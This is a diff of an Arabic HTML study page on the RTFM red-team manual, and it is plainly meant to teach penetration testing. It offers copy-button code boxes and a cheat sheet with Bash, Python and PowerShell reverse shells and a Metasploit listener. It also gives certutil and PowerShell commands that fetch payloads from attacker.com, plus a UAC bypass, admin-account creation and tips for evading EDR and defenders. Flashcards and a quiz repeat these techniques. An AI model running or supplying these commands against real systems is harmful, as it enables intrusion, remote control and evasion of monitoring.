@@ -544,80 +544,371 @@
 
       <!-- Left Main Content -->
       <main class="book-content" id="main-content-rtfm">
+
         <!-- Section 1 -->
-        <section id="rtfm-linux" class="content-sec">
-          <h2 class="sec-title">1. أوامر الاستكشاف والترقية لنظام Linux (Linux Post-Exploitation)</h2>
-          <p>مذكرة الأوامر الفورية الخاصة بالفريق الأحمر للاستطلاع الداخلي وترقية الامتيازات (Privilege Escalation):</p>
+        <section id="rtfm-nmap" class="content-sec">
+          <h2 class="sec-title">1. فحص الشبكة المتقدم بـ Nmap</h2>
+          <p>أوامر الفحص السريع والذكي مع تجاوز جدران الحماية وكشف الخدمات وسكريبتات Nmap (NSE):</p>
           <div class="code-box">
-            <button class="copy-btn" onclick="copyCode(this)">نسخ الأوامر</button>
-            <pre># Check current privileges
-id && whoami && uname -a
+            <button class="copy-btn" onclick="copyCode(this)">نسخ</button>
+            <pre># Syn Stealth Scan with OS and version detection
+nmap -sS -Pn -O -sV -F 192.168.1.1
 
-# Search for SUID files (files running with root authority)
-find / -perm -4000 -type f 2>/dev/null
+# Vulnerability scan using NSE scripts
+nmap --script vuln 192.168.1.1
 
-# Check commands permitted with sudo without password
-sudo -l
-
-# Check active local ports
-netstat -tulpn | grep LISTEN</pre>
+# Bypass firewall by fragmenting packets
+nmap -f -t 0 192.168.1.1</pre>
           </div>
-        </section>
+</section>
 
         <!-- Section 2 -->
-        <section id="rtfm-windows" class="content-sec">
-          <h2 class="sec-title">2. أوامر الاستطلاع والسيطرة لنظام Windows (Windows Post-Exploitation)</h2>
-          <p>أوامر فحص النظام والحماية وتحديد صلاحيات المستخدمين:</p>
+        <section id="rtfm-shells" class="content-sec">
+          <h2 class="sec-title">2. توليد Reverse Shells وتثبيتها</h2>
+          <p>بايلودز Reverse Shells بلغات مختلفة لاستقبال الاتصال على سيرفر المهاجم:</p>
           <div class="code-box">
             <button class="copy-btn" onclick="copyCode(this)">نسخ الأوامر</button>
-            <pre># Check system information and hotfixes
-systeminfo | findstr /B /C:"OS Name" /C:"OS Version" /C:"System Type"
+            <pre># Bash reverse shell
+bash -i >& /dev/tcp/10.10.10.10/4444 0>&1
 
-# List enabled privileges of current user
-whoami /priv
+# Python3 reverse shell
+python3 -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.10.10",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/bash")'
 
-# Audit service configuration for weak paths (Unquoted Service Paths)
-wmic service get name,displayname,pathname,startmode | findstr /i "auto" | findstr /i /v "c:\\windows\\" | findstr /i /v "c:\\windows\\"
-
-# Query registry for stored passwords
-reg query HKLM /f password /t REG_SZ /s</pre>
+# Powershell reverse shell
+powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient("10.10.10.10",4444);...</pre>
           </div>
-        </section>
+</section>
 
         <!-- Section 3 -->
-        <section id="rtfm-ad" class="content-sec">
-          <h2 class="sec-title">3. فحص واستغلال الـ Active Directory</h2>
-          <p>أوامر استكشاف النطاق (Domain Recon) والسيطرة على الدومين بالكامل:</p>
+        <section id="rtfm-pivoting" class="content-sec">
+          <h2 class="sec-title">3. تحويل الاتجاه والتحويل الشبكي (Pivoting & Port Forwarding)</h2>
+          <p>التنقل داخل الشبكة الداخلية بعد السيطرة على جهاز وسيط (Pivoting):</p>
           <div class="code-box">
-            <button class="copy-btn" onclick="copyCode(this)">نسخ الأوامر</button>
-            <pre># Query current Domain Controller
-nltest /dclist:domain_name
-
-# Query list of Domain Admins
-net group "Domain Admins" /domain
-
-# PowerShell bypass to run Powerview execution policy
-powershell -ep bypass -c "IEX (New-Object Net.WebClient).DownloadString('http://attacker.com/PowerView.ps1'); Get-NetUser"</pre>
+            <button class="copy-btn" onclick="copyCode(this)">نسخ</button>
+            <pre id="cmd-rtfm-ssh"># توجيه منفذ محلي عبر SSH
+ssh -N -L 0.0.0.0:8080:10.10.10.25:80 user@pivot_ip</pre>
           </div>
         </section>
 
         <!-- Section 4 -->
-        <section id="rtfm-net" class="content-sec">
-          <h2 class="sec-title">4. أوامر الشبكات والفحص والتنقل الجانبي (Lateral Movement)</h2>
-          <p>كيفية فتح قنوات اتصال خلفية ونقل الملفات واستغلال المنافذ المفتوحة:</p>
+        <section id="rtfm-privesc" class="content-sec">
+          <h2 class="sec-title">4. تخطي الصلاحيات في ويندوز ولينكس</h2>
+          <p>أوامر فحص الثغرات المحلية والترقية لـ Root/Administrator:</p>
           <div class="code-box">
             <button class="copy-btn" onclick="copyCode(this)">نسخ الأوامر</button>
-            <pre># Fast network host discovery using ping sweeping (Linux)
-for i in {1..254}; do ping -c 1 192.168.1.$i | grep "from"; done
+            <pre># Search for SUID files in Linux
+find / -perm -4000 -type f 2>/dev/null
 
-# Local port forwarding using SSH
-ssh -L 8080:localhost:80 target_user@target_ip
+# Check privileges in Windows
+whoami /priv
 
-# Fast transfer of files over HTTP using Python
-python3 -m http.server 80</pre>
+# Bypass Windows execution policy
+powershell -ep bypass</pre>
+          </div>
+</section>
+
+        <!-- Section 5 -->
+        <section id="rtfm-msf" class="content-sec">
+          <h2 class="sec-title">5. سكريبتات وأوامر Metasploit Pro</h2>
+          <p>تجهيز مستمع (Listener) لاستقبال اتصالات الـ Meterpreter:</p>
+          <div class="code-box">
+            <button class="copy-btn" onclick="copyCode(this)">نسخ</button>
+            <pre id="cmd-rtfm-msf">use exploit/multi/handler
+set payload windows/meterpreter/reverse_tcp
+set LHOST 10.10.10.25
+set LPORT 4444
+exploit -j</pre>
           </div>
         </section>
-</main>
+
+        <!-- Section 6 -->
+        <section id="rtfm-cheat" class="content-sec">
+          <h2 class="sec-title">6. جدول الأوامر السريعة الموحدة (RTFM Command Cheat Sheet)</h2>
+          <table class="cheat-sheet-table">
+            <thead>
+              <tr>
+                <th>الهدف / المهمة</th>
+                <th>أمر سطر الأوامر المستعمل</th>
+                <th>البيئة / النظام</th>
+              </tr>
+            </thead>
+            <tbody>
+              <tr>
+                <td>فحص المنافذ السريع</td>
+                <td id="td-rtfm-nmap"><code>nmap -sS -Pn -p- -T4 --open 10.10.10.25</code></td>
+                <td>Linux / Windows</td>
+              </tr>
+              <tr>
+                <td>توليد Reverse Shell</td>
+                <td id="td-rtfm-bash"><code>bash -i >& /dev/tcp/10.10.10.25/4444 0>&1</code></td>
+                <td>Linux (Bash)</td>
+              </tr>
+              <tr>
+                <td>فحص صلاحيات sudo</td>
+                <td><code>sudo -l</code></td>
+                <td>Linux</td>
+              </tr>
+              <tr>
+                <td>تنزيل ملف خارجي</td>
+                <td><code>certutil -urlcache -f http://url file.exe</code></td>
+                <td>Windows (Cmd)</td>
+              </tr>
+            </tbody>
+          </table>
+        </section>
+
+        <!-- Section 7 -->
+                        <!-- Flashcards Section -->
+        <section id="rtfm-flashcards" class="content-sec">
+          <h2 class="sec-title">🎴 كروت المراجعة السيبرانية الذكية (Interactive 3D Flashcards)</h2>
+          <p>كروت مراجعة تفاعلية لحفظ الأوامر والبصمات. انقر على أي كرت لقلبه ومعرفة الإجابة النموذجية:</p>
+          
+          <div class="flashcards-grid">
+            <div class="flashcard-wrapper" onclick="toggleFlashcard(this)">
+              <div class="flashcard-inner">
+                <div class="flashcard-front">
+                  <div style="font-size: 1.5rem; margin-bottom: 8px;">❓</div>
+                  <div style="font-size: 0.85rem; font-weight: bold; line-height: 1.4;">ما معنى منهجية Living off the Land (LoTL)؟</div>
+                </div>
+                <div class="flashcard-back">
+                  <div style="font-size: 1.5rem; margin-bottom: 8px;">💡</div>
+                  <div style="font-size: 0.85rem; font-weight: bold; line-height: 1.4; font-family: monospace;">استخدام أدوات النظام الرسمية الموثوقة لتجنب كشف برنامج الحماية EDR</div>
+                </div>
+              </div>
+            </div>
+            <div class="flashcard-wrapper" onclick="toggleFlashcard(this)">
+              <div class="flashcard-inner">
+                <div class="flashcard-front">
+                  <div style="font-size: 1.5rem; margin-bottom: 8px;">❓</div>
+                  <div style="font-size: 0.85rem; font-weight: bold; line-height: 1.4;">كيف نفعل نفق اتصال بـ SSH Reverse Port Forwarding؟</div>
+                </div>
+                <div class="flashcard-back">
+                  <div style="font-size: 1.5rem; margin-bottom: 8px;">💡</div>
+                  <div style="font-size: 0.85rem; font-weight: bold; line-height: 1.4; font-family: monospace;">ssh -R local_port:target_ip:target_port user@attacker_ip</div>
+                </div>
+              </div>
+            </div>
+            <div class="flashcard-wrapper" onclick="toggleFlashcard(this)">
+              <div class="flashcard-inner">
+                <div class="flashcard-front">
+                  <div style="font-size: 1.5rem; margin-bottom: 8px;">❓</div>
+                  <div style="font-size: 0.85rem; font-weight: bold; line-height: 1.4;">ما هي الأداة الأساسية لتخطي صلاحيات UAC بنظام ويندوز؟</div>
+                </div>
+                <div class="flashcard-back">
+                  <div style="font-size: 1.5rem; margin-bottom: 8px;">💡</div>
+                  <div style="font-size: 0.85rem; font-weight: bold; line-height: 1.4; font-family: monospace;">Fodhelper.exe bypass</div>
+                </div>
+              </div>
+            </div>
+            <div class="flashcard-wrapper" onclick="toggleFlashcard(this)">
+              <div class="flashcard-inner">
+                <div class="flashcard-front">
+                  <div style="font-size: 1.5rem; margin-bottom: 8px;">❓</div>
+                  <div style="font-size: 0.85rem; font-weight: bold; line-height: 1.4;">ما هو الأمر لرفع ملف بالخلفية باستخدام PowerShell؟</div>
+                </div>
+                <div class="flashcard-back">
+                  <div style="font-size: 1.5rem; margin-bottom: 8px;">💡</div>
+                  <div style="font-size: 0.85rem; font-weight: bold; line-height: 1.4; font-family: monospace;">Invoke-WebRequest أو Start-BitsTransfer</div>
+                </div>
+              </div>
+            </div>
+            <div class="flashcard-wrapper" onclick="toggleFlashcard(this)">
+              <div class="flashcard-inner">
+                <div class="flashcard-front">
+                  <div style="font-size: 1.5rem; margin-bottom: 8px;">❓</div>
+                  <div style="font-size: 0.85rem; font-weight: bold; line-height: 1.4;">كيف ننشئ مستخدم محلي جديد بمستوى Admin بالويندوز؟</div>
+                </div>
+                <div class="flashcard-back">
+                  <div style="font-size: 1.5rem; margin-bottom: 8px;">💡</div>
+                  <div style="font-size: 0.85rem; font-weight: bold; line-height: 1.4; font-family: monospace;">net user /add ثم net localgroup administrators /add</div>
+                </div>
+              </div>
+            </div>
+          </div>
+        </section>
+
+        <!-- Payload Sandbox Section -->
+        <section id="rtfm-sandbox" class="content-sec">
+          <h2 class="sec-title">🧪 مختبر حقن البايلودز الحي (Interactive Payload Sandbox)</h2>
+          <p>مختبر محاكاة تفاعلي لاختبار وتحليل البايلودز ورؤية الاستجابة المباشرة للخوادم:</p>
+          
+          <div style="background: rgba(3,3,8,0.9); border: 1px solid var(--border-glass); border-radius: 8px; padding: 20px; margin: 20px 0;">
+            <div style="margin-bottom: 15px;">
+              <label style="color:#fff; font-size:0.85rem; font-weight:700; display:block; margin-bottom:5px;">اختر نوع الثغرة للاختبار:</label>
+              <select id="sandbox-type-rtfm" onchange="updateSandboxPayloads('rtfm')" style="background:#0d0d1a; border:1px solid rgba(255,255,255,0.15); color:#fff; padding:8px; border-radius:4px; width:100%; outline:none; font-size:0.85rem;">
+                <option value="sqli">SQL Injection (SQLi)</option>
+                <option value="xss">Cross-Site Scripting (XSS)</option>
+                <option value="ssrf">Server-Side Request Forgery (SSRF)</option>
+              </select>
+            </div>
+            
+            <div style="margin-bottom: 15px;">
+              <label style="color:#fff; font-size:0.85rem; font-weight:700; display:block; margin-bottom:5px;">البايلود (Payload Input):</label>
+              <input type="text" id="sandbox-payload-rtfm" value="' OR '1'='1" style="background:#0d0d1a; border:1px solid rgba(255,255,255,0.15); color:var(--accent-cyan); padding:10px; border-radius:4px; width:100%; outline:none; font-family:monospace; font-size:0.85rem; box-sizing:border-box;">
+            </div>
+
+            <button onclick="runSandboxExploit('rtfm')" style="background:var(--gradient-primary); border:none; color:#fff; padding:10px 20px; border-radius:4px; font-weight:700; cursor:pointer; width:100%; font-size:0.88rem;">
+              ⚡ تنفيذ الهجوم ومحاكاة الاستجابة
+            </button>
+
+            <!-- Terminal Output -->
+            <div style="margin-top: 20px; background:#000; border: 1px solid rgba(255,255,255,0.08); border-radius: 6px; overflow: hidden;">
+              <div style="background:#0d0d1a; padding:6px 12px; font-size:0.72rem; color:var(--text-secondary); border-bottom:1px solid rgba(255,255,255,0.08); font-family:monospace; display:flex; justify-content:space-between;">
+                <span>CONSOLE OUTPUT</span>
+                <span>STATUS: ACTIVE</span>
+              </div>
+              <div id="sandbox-terminal-rtfm" style="padding:15px; font-family:monospace; font-size:0.8rem; color:#00ff66; min-height:120px; max-height:200px; overflow-y:auto; line-height:1.5; text-align:left; direction:ltr;">
+                [+] System ready. Input payload and click Execute to begin simulation...
+              </div>
+            </div>
+
+            <!-- Virtual Browser Frame if XSS -->
+            <div id="sandbox-browser-wrap-rtfm" style="margin-top: 20px; border: 1px solid rgba(255,255,255,0.08); border-radius: 6px; overflow: hidden; display:none;">
+              <div style="background:#0d0d1a; padding:6px 12px; font-size:0.72rem; color:var(--text-secondary); border-bottom:1px solid rgba(255,255,255,0.08); font-family:monospace;">
+                🖥️ VIRTUAL BROWSER FRAME
+              </div>
+              <div id="sandbox-browser-content-rtfm" style="background:#fff; color:#000; padding:20px; text-align:center; min-height:80px; font-size:0.9rem;">
+                Virtual Viewport
+              </div>
+            </div>
+
+          </div>
+        </section>
+
+<!-- Author Strategic Tips -->
+        <section id="rtfm-tips" class="content-sec">
+          <h2 class="sec-title">💡 نصائح وتوجيهات الكاتب الميدانية (Red Team Golden Advice)</h2>
+          <p>جمعنا لك هنا زبدة الخبرة العملية والنصائح الذهبية التي يركز عليها الكاتب في فصول كتابه للتنقيب والعمل الميداني الفعلي:</p>
+          
+          <div class="benefit-box">
+            <ul style="margin: 0; padding-right: 20px;">
+              <li style='margin-bottom: 12px;'><strong>اعتمد على منهجية Living off the Land (LoTL):</strong> استخدم الأدوات الرسمية المثبتة بالنظام (مثل certutil, powershell) لتجنب تنبيه الـ EDR.</li>
+              <li style='margin-bottom: 12px;'><strong>تحقق دائماً من مستوى صلاحياتك:</strong> قبل تشغيل أي أمر عدواني أو فحص واسع، تأكد من البيئة لتفادي لفت انتباه المدافعين.</li>
+              <li style='margin-bottom: 12px;'><strong>حافظ على هدوء اتصالك (Low and Slow):</strong> لا ترسل مئات حزم البيانات بالثانية، الاتصال الهادئ والمنظم يحميك من الحظر التلقائي.</li>
+            </ul>
+          </div>
+        </section>
+
+        <section id="rtfm-quiz" class="content-sec">
+          <h2 class="sec-title">7. بنك الأسئلة والاختبارات التفاعلية الـ 10</h2>
+          
+          <div class="quiz-container">
+            <div class="quiz-title">🧪 بنك أسئلة مراجعة كتاب RTFM (انقر لعرض الإجابة النموذجية)</div>
+            
+            <!-- Q1 -->
+            <div class="quiz-item" style="margin-bottom:15px; border-bottom:1px dashed rgba(255,255,255,0.05); padding-bottom:15px;">
+              <button class="quiz-question-btn" onclick="toggleAnswerRtfm('qr-1')">
+                <span>1. ما هو الفرق بين SSH Local Port Forwarding و Remote Port Forwarding؟</span>
+                <span class="toggle-icon" id="icon-qr-1">[ + ]</span>
+              </button>
+              <div class="quiz-answer-panel" id="ans-qr-1">
+                <strong>الإجابة النموذجية:</strong> الـ Local Port Forwarding (-L) يفتح منفذاً على جهازك المحلي ويوجه حركة البيانات منه لجهاز بعيد عبر خادم الـ SSH. بينما الـ Remote Port Forwarding (-R) يفتح منفذاً على خادم الـ SSH البعيد ويوجه حركة البيانات منه لجهازك المحلي أو جهاز في شبكتك.
+              </div>
+            </div>
+
+            <!-- Q2 -->
+            <div class="quiz-item" style="margin-bottom:15px; border-bottom:1px dashed rgba(255,255,255,0.05); padding-bottom:15px;">
+              <button class="quiz-question-btn" onclick="toggleAnswerRtfm('qr-2')">
+                <span>2. لماذا نستخدم الخيار -Pn في فحص Nmap ومتى يكون حيوياً؟</span>
+                <span class="toggle-icon" id="icon-qr-2">[ + ]</span>
+              </button>
+              <div class="quiz-answer-panel" id="ans-qr-2">
+                <strong>الإجابة النموذجية:</strong> نستخدمه لتعطيل فحص تواجد الجهاز الأولي (Ping probe) وافتراض أن الجهاز مستهدف ونشط دائماً. هذا حيوى لأن جدران الحماية غالباً ما تحظر حزم الـ ICMP ping، وفحص Nmap العادي سيفترض أن الجهاز مغلق ويتخطاه بالرغم من أن منافذه مفتوحة بالفعل.
+              </div>
+            </div>
+
+            <!-- Q3 -->
+            <div class="quiz-item" style="margin-bottom:15px; border-bottom:1px dashed rgba(255,255,255,0.05); padding-bottom:15px;">
+              <button class="quiz-question-btn" onclick="toggleAnswerRtfm('qr-3')">
+                <span>3. كيف ترقي شل عادي للينكس إلى شل تفاعلي كامل TTY لتشغيل الأوامر التفاعلية مثل nano؟</span>
+                <span class="toggle-icon" id="icon-qr-3">[ + ]</span>
+              </button>
+              <div class="quiz-answer-panel" id="ans-qr-3">
+                <strong>الإجابة النموذجية:</strong> نقوم بتشغيل أمر البايثون `python3 -c 'import pty; pty.spawn("/bin/bash")'` ثم إرسال الشل للخلفية بـ `Ctrl+Z` ثم تشغيل `stty raw -echo; fg` ثم إعادة تشغيل الشل بـ `reset` لنحصل على واجهة شل تفاعلية بالكامل تدعم التكميل بـ Tab والأسهم وتعديل النصوص.
+              </div>
+            </div>
+
+            <!-- Q4 -->
+            <div class="quiz-item" style="margin-bottom:15px; border-bottom:1px dashed rgba(255,255,255,0.05); padding-bottom:15px;">
+              <button class="quiz-question-btn" onclick="toggleAnswerRtfm('qr-4')">
+                <span>4. كيف تكتشف ملفات الـ SUID الضعيفة في نظام لينكس وكيف تستخدم لرفع الصلاحيات؟</span>
+                <span class="toggle-icon" id="icon-qr-4">[ + ]</span>
+              </button>
+              <div class="quiz-answer-panel" id="ans-qr-4">
+                <strong>الإجابة النموذجية:</strong> نبحث عنها باستخدام الأمر `find / -perm -u=s -type f 2>/dev/null`. الـ SUID تسمح بتشغيل الملف بصلاحيات مالكه (وهو الأدمن عادة). إذا كان أحد البرامج المكتشفة مصاباً بثغرة أو يدعم تنفيذ الأوامر (مثل nmap القديم أو find)، يمكننا استغلاله لتشغيل شل بصلاحيات الـ Root.
+              </div>
+            </div>
+
+            <!-- Q5 -->
+            <div class="quiz-item" style="margin-bottom:15px; border-bottom:1px dashed rgba(255,255,255,0.05); padding-bottom:15px;">
+              <button class="quiz-question-btn" onclick="toggleAnswerRtfm('qr-5')">
+                <span>5. ما هو الـ Windows Alternate Data Streams (ADS) وكيف يستخدمه الـ Red Team لإخفاء الملفات؟</span>
+                <span class="toggle-icon" id="icon-qr-5">[ + ]</span>
+              </button>
+              <div class="quiz-answer-panel" id="ans-qr-5">
+                <strong>الإجابة النموذجية:</strong> هي ميزة في نظام ملفات NTFS تسمح بإرفاق بيانات ومعلومات إضافية بداخل ملف أخر دون أن يتغير حجمه الظاهري أو محتواه الأساسي. يستخدمه المهاجمون لإخفاء الملفات الخبيثة أو الشيل داخل ملف نصي بريء وتأمين بقائه بالخفاء.
+              </div>
+            </div>
+
+            <!-- Q6 -->
+            <div class="quiz-item" style="margin-bottom:15px; border-bottom:1px dashed rgba(255,255,255,0.05); padding-bottom:15px;">
+              <button class="quiz-question-btn" onclick="toggleAnswerRtfm('qr-6')">
+                <span>6. كيف يمكن استخدام أداة Certutil في ويندوز لتنزيل ملفات خارجية خبيثة؟</span>
+                <span class="toggle-icon" id="icon-qr-6">[ + ]</span>
+              </button>
+              <div class="quiz-answer-panel" id="ans-qr-6">
+                <strong>الإجابة النموذجية:</strong> أداة `certutil` هي برنامج رسمي في ويندوز مخصص لإدارة الشهادات، ولكن يمكن إساءة استخدامه لتنزيل ملفات من روابط خارجية بطلبات HTTP بسيطة عبر الأمر `certutil -urlcache -f http://attacker.com/payload.exe payload.exe` لتخطي قيود حظر التنزيل.
+              </div>
+            </div>
+
+            <!-- Q7 -->
+            <div class="quiz-item" style="margin-bottom:15px; border-bottom:1px dashed rgba(255,255,255,0.05); padding-bottom:15px;">
+              <button class="quiz-question-btn" onclick="toggleAnswerRtfm('qr-7')">
+                <span>7. ما هي ثغرة الـ MS17-010 (EternalBlue) الشهيرة وكيف تستغل بروتوكول SMB؟</span>
+                <span class="toggle-icon" id="icon-qr-7">[ + ]</span>
+              </button>
+              <div class="quiz-answer-panel" id="ans-qr-7">
+                <strong>الإجابة النموذجية:</strong> هي ثغرة في بروتوكول مشاركة الملفات SMBv1 في أنظمة ويندوز، تسمح للمهاجم بإرسال حزم ملوثة معدة خصيصاً لتسبب خطأ تضخيم الذاكرة (Buffer Overflow) في نواة النظام، مما يؤدي لتشغيل أكواد عشوائية والحصول على صلاحيات SYSTEM بالكامل بدون استيقان.
+              </div>
+            </div>
+
+            <!-- Q8 -->
+            <div class="quiz-item" style="margin-bottom:15px; border-bottom:1px dashed rgba(255,255,255,0.05); padding-bottom:15px;">
+              <button class="quiz-question-btn" onclick="toggleAnswerRtfm('qr-8')">
+                <span>8. كيف يعمل فحص الـ TCP SYN Stealth Scan في Nmap؟</span>
+                <span class="toggle-icon" id="icon-qr-8">[ + ]</span>
+              </button>
+              <div class="quiz-answer-panel" id="ans-qr-8">
+                <strong>الإجابة النموذجية:</strong> يرسل حزمة SYN الأولوية لمعرفة حالة المنفذ. إذا رد السيرفر بـ SYN-ACK، فهذا يعني أن المنفذ مفتوح، وهنا يرسل Nmap حزمة RST لقطع الاتصال فوراً قبل إتمام عملية المصافحة الثلاثية (Three-way handshake)، مما يمنع التطبيق من تسجيل محاولة الاتصال بالكامل بسجلاته.
+              </div>
+            </div>
+
+            <!-- Q9 -->
+            <div class="quiz-item" style="margin-bottom:15px; border-bottom:1px dashed rgba(255,255,255,0.05); padding-bottom:15px;">
+              <button class="quiz-question-btn" onclick="toggleAnswerRtfm('qr-9')">
+                <span>9. ما هو هجوم الـ Token Impersonation في أنظمة ويندوز؟</span>
+                <span class="toggle-icon" id="icon-qr-9">[ + ]</span>
+              </button>
+              <div class="quiz-answer-panel" id="ans-qr-9">
+                <strong>الإجابة النموذجية:</strong> هو تقمص دور معرف الجلسة لمستخدم أخر نشط على نفس النظام. إذا نجح المهاجم في الحصول على صلاحيات المدير، يمكنه الاستعانة بأدوات مثل Meterpreter لسرقة توكنز المستخدمين النشطين وتقمص هويتهم للوصول للملفات المشتركة والخدمات الداخلية.
+              </div>
+            </div>
+
+            <!-- Q10 -->
+            <div class="quiz-item">
+              <button class="quiz-question-btn" onclick="toggleAnswerRtfm('qr-10')">
+                <span>10. كيف تكتشف ثغرات الـ Cron Jobs الضعيفة في أنظمة لينكس لرفع الصلاحيات؟</span>
+                <span class="toggle-icon" id="icon-qw-10">[ + ]</span>
+              </button>
+              <div class="quiz-answer-panel" id="ans-qr-10">
+                <strong>الإجابة النموذجية:</strong> نبحث عن المهام المجدولة (Cron jobs) التي تعمل بصلاحيات Root ولكنها تستدعي ملفاً يملك المستخدم العادي صلاحية التعديل والكتابة عليه. نقوم بتعديل محتوى هذا الملف وكتابة كود استدعاء شل عكسي، وبمجرد تشغيل النظام للمهمة مجدداً سيعمل الشل بصلاحيات الـ Root.
+              </div>
+            </div>
+
+          </div>
+        </section>
+
+      </main>
 
     </div>
 
